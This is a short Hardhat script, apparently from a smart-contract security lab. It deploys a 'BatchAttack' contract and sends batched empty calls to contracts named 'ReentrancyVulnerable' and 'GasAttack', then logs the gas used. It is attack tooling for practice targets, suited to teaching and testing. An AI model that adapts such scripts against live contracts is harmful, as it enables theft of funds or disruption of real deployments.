const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Batch Attack initiated");

    const deployments = require("../deployments.json");
    const BatchAttack = await hre.ethers.getContractFactory("BatchAttack");
    const batch = await BatchAttack.deploy();
    await batch.deployed();

    const calls = [
        {target: deployments.ReentrancyVulnerable, value: 0, data: "0x"},
        {target: deployments.GasAttack, value: 0, data: "0x"}
    ];

    const tx = await batch.executeBatch(calls);
    const receipt = await tx.wait();

    console.log("[✓] Batch attack executed");
    console.log("    Calls:", calls.length);
    console.log("    Gas used:", receipt.gasUsed.toString());
}

main().catch(console.error);
